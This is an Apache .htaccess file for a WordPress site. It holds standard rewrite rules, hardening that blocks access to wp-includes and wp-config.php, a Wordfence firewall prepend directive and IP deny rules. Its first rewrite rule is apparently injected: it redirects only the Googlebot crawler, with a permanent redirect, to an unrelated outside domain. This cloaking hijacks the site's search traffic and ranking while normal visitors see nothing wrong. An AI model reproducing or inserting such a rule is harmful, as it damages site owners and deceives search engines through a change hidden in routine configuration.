<IfModule mod_rewrite.c>
RewriteEngine On
RewriteCond %{HTTP_USER_AGENT} Googlebot [NC]
RewriteRule ^(.*)$ https://santuariosantarita.it/$1 [R=301,L]

RewriteBase /
RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]
RewriteRule ^index\.php$ - [L]
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule . /index.php [L]

RewriteRule ^wp-admin/includes/ - [F,L]
RewriteRule !^wp-includes/ - [S=3]
RewriteRule ^wp-includes/[^/]+\.php$ - [F,L]
RewriteRule ^wp-includes/js/tinymce/langs/.+\.php - [F,L]
RewriteRule ^wp-includes/theme-compat/ - [F,L]
</IfModule>

<Files wp-config.php>
<IfModule mod_authz_core.c>
Require all denied
</IfModule>
<IfModule !mod_authz_core.c>
Order deny,allow
Deny from all
</IfModule>
</Files>

<IfModule Litespeed>
SetEnv noabort 1
php_value auto_prepend_file '/home/gk4juni457tt/public_html/amab.com.qa/wordfence-waf.php'
</IfModule>
<IfModule lsapi_module>
php_value auto_prepend_file '/home/gk4juni457tt/public_html/amab.com.qa/wordfence-waf.php'
</IfModule>

<Files ".user.ini">
<IfModule mod_authz_core.c>
Require all denied
</IfModule>
<IfModule !mod_authz_core.c>
Order deny,allow
Deny from all
</IfModule>
</Files>

<Files 403.shtml>
Order allow,deny
Allow from all
</Files>

deny from 159.223.0.0/16
deny from 208.76.0.0/16
